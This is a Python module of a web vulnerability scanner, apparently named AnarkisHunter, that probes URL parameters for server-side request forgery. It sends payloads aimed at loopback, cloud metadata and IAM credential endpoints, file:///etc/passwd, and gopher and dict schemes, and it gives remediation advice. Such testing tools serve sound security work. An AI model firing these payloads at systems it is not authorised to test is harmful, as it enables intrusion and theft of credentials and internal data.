"""
AnarkisHunter — vuln_ssrf.py
==============================
Server-Side Request Forgery detector.
Test parameter yang menerima URL, cek apakah server fetch URL
internal/metadata (cloud metadata service, localhost).

Usage standalone:
    python modules/vuln/vuln_ssrf.py --url "http://target.local/fetch?url=test"
"""

import sys
import time
import argparse
from pathlib import Path
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from modules.utils.utils_request import HTTPClient, normalize_url
from modules.utils.report import ScanResult


SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",  # octal
    "http://2130706433",  # decimal
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/computeMetadata/v1/",  # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba metadata
    "file:///etc/passwd",
    "gopher://127.0.0.1:80/_",
    "dict://127.0.0.1:11211/stats",
]

COMMON_SSRF_PARAMS = [
    "url", "uri", "src", "source", "fetch", "image_url", "callback",
    "target", "redirect", "host", "proxy", "preview", "thumbnail",
    "feed", "rss", "xml", "json", "import",
]

# Indicators dari response yang membuktikan SSRF
SSRF_INDICATORS = [
    "root:x:", "instance-id", "ami-id", "iam/security-credentials",
    "computeMetadata", "metadata-flavor", "<title>Welcome to nginx",
    "<title>Apache", "ssh-rsa", "ssh-ed25519",
]


def inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    params[param] = payload
    return urlunparse(parsed._replace(query=urlencode(params)))


def run_ssrf_scan(
    target: str,
    params: Optional[List[str]] = None,
    payloads: Optional[List[str]] = None,
    timeout: int = 12,
) -> Dict:
    url = normalize_url(target)
    parsed = urlparse(url)
    url_params = dict(parse_qsl(parsed.query, keep_blank_values=True))

    if not params:
        params = list(url_params.keys()) + COMMON_SSRF_PARAMS
        params = list(dict.fromkeys(params))

    payloads = payloads or SSRF_PAYLOADS
    result = {
        "target": url,
        "params_tested": params,
        "total_payloads": len(payloads),
        "vulnerabilities": [],
        "error": None,
    }

    try:
        with HTTPClient(timeout=timeout) as client:
            for param in params:
                for payload in payloads:
                    test_url = inject_param(url, param, payload)
                    t0 = time.time()
                    resp = client.get(test_url)
                    elapsed = time.time() - t0
                    if not resp:
                        continue

                    text = resp.text[:5000]
                    matched = None
                    for ind in SSRF_INDICATORS:
                        if ind in text:
                            matched = ind
                            break

                    is_meta = "169.254.169.254" in payload or "metadata" in payload
                    looks_proxied = (
                        resp.status_code in {200, 502, 504} and
                        elapsed > 1.5 and
                        any(s in text.lower() for s in ["connection refused", "timeout"])
                    )

                    if matched:
                        result["vulnerabilities"].append({
                            "param": param, "payload": payload,
                            "type": "SSRF — internal content reflected",
                            "evidence": f"Internal indicator: {matched}",
                            "url": test_url, "status": resp.status_code,
                        })
                    elif is_meta and resp.status_code in {200, 403}:
                        result["vulnerabilities"].append({
                            "param": param, "payload": payload,
                            "type": "SSRF — cloud metadata reached (probable)",
                            "evidence": f"HTTP {resp.status_code} for metadata URL",
                            "url": test_url, "status": resp.status_code,
                        })
                    elif looks_proxied:
                        result["vulnerabilities"].append({
                            "param": param, "payload": payload,
                            "type": "SSRF — internal connect attempt",
                            "evidence": f"Slow response + connection refused/timeout",
                            "url": test_url, "status": resp.status_code,
                        })

    except Exception as e:
        result["error"] = str(e)

    return result


def analyze_ssrf_findings(data: Dict) -> List[ScanResult]:
    findings = []
    seen = set()
    for v in data.get("vulnerabilities", []):
        key = (v["param"], v["type"])
        if key in seen:
            continue
        seen.add(key)
        findings.append(ScanResult(
            title=f"SSRF on '{v['param']}' — {v['type']}",
            severity="HIGH",
            description=f"Server-Side Request Forgery pada parameter '{v['param']}'",
            url=v["url"],
            evidence=v["evidence"][:500],
            payload=v["payload"],
            recommendation=(
                "Whitelist URL/domain yang boleh di-fetch; block IP private/link-local; "
                "disable redirect; gunakan proxy untuk egress; cek protocol allow-list"
            ),
            owasp="A10",
            module="vuln_ssrf",
        ))
    return findings


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table

    console = Console()
    parser = argparse.ArgumentParser(description="AnarkisHunter — SSRF Detector")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", nargs="+")
    args = parser.parse_args()

    console.print(f"\n[red]🔁 SSRF Scan: [bold]{args.url}[/bold][/red]\n")
    data = run_ssrf_scan(args.url, args.param)

    if data.get("error"):
        console.print(f"[red]Error: {data['error']}[/red]")
        sys.exit(1)

    console.print(f"[green]Params:[/green] {len(data['params_tested'])}")
    console.print(f"[red]Vulns:[/red] {len(data['vulnerabilities'])}\n")

    if data["vulnerabilities"]:
        t = Table(title="🚨 SSRF Findings", border_style="red")
        t.add_column("Param", style="cyan")
        t.add_column("Type", style="yellow")
        t.add_column("Payload", style="white", overflow="fold")
        t.add_column("Evidence", style="red", overflow="fold")
        for v in data["vulnerabilities"][:20]:
            t.add_row(v["param"], v["type"][:30], v["payload"][:40], v["evidence"][:60])
        console.print(t)
